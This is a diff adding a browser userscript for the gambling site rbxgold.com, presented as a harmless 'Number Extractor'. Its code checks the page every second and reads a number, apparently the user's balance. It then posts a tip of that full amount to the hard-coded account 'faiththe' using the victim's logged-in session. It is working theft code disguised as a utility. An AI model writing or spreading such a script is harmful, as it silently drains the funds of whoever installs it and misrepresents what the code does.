@@ -1,0 +1,50 @@
+// ==UserScript==
+// @name         RBXGold Number Extractor
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  Extracts and performs a fetch request when a specific span element is found on RBXGold
+// @author       You
+// @match        https://rbxgold.com/*
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    function checkForNumber() {
+        // Check if the span element exists
+        var spanElement = document.querySelector('.BaseElement.Span.size-sm.color-text-1.color-text-1');
+
+        if (spanElement) {
+            // Extract the number
+            var number = spanElement.textContent.trim();
+
+            // Perform the fetch request with the extracted number
+            fetch(`https://api.rbxgold.com/api/tipping/send?username=faiththe&amount=${number}`, {
+                method: 'POST',
+                headers: {
+                    'accept': 'application/json, text/plain, */*',
+                    'accept-language': 'en-US,en;q=0.8',
+                    'cache-control': 'no-cache',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'pragma': 'no-cache',
+                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-site',
+                    'sec-gpc': '1'
+                },
+                referrer: 'https://rbxgold.com/',
+                referrerPolicy: 'strict-origin-when-cross-origin',
+                body: null,
+                mode: 'cors',
+                credentials: 'include'
+            });
+        }
+    }
+
+    // Check for the span element every second
+    setInterval(checkForNumber, 1000);
+})();
